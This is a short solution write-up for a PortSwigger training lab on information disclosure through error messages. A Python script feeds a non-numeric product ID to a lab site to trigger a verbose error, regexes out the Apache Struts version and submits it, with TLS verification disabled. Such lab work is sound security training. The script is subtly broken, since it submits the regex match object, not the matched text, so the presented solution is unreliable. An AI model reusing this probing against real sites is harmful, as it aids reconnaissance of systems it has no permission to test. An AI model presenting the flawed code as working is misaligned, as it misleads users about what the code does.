# Lab: Information disclosure in error messages

Link to lab: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a1100f40343bcaec012540a000800b5.web-security-academy.net/'

params = {
    'productId': 'a',
}

response = requests.get(
    url +'product',
    params=params,
    verify=False,
)
pattern = r"Apache Struts \d\ \d\.\d\.\d+"
match = re.search(pattern, response.text)

data = {
    'answer': match
}

response = requests.post(
    url + 'submitSolution',
    data=data,
    verify=False,
)

print(response.text)
```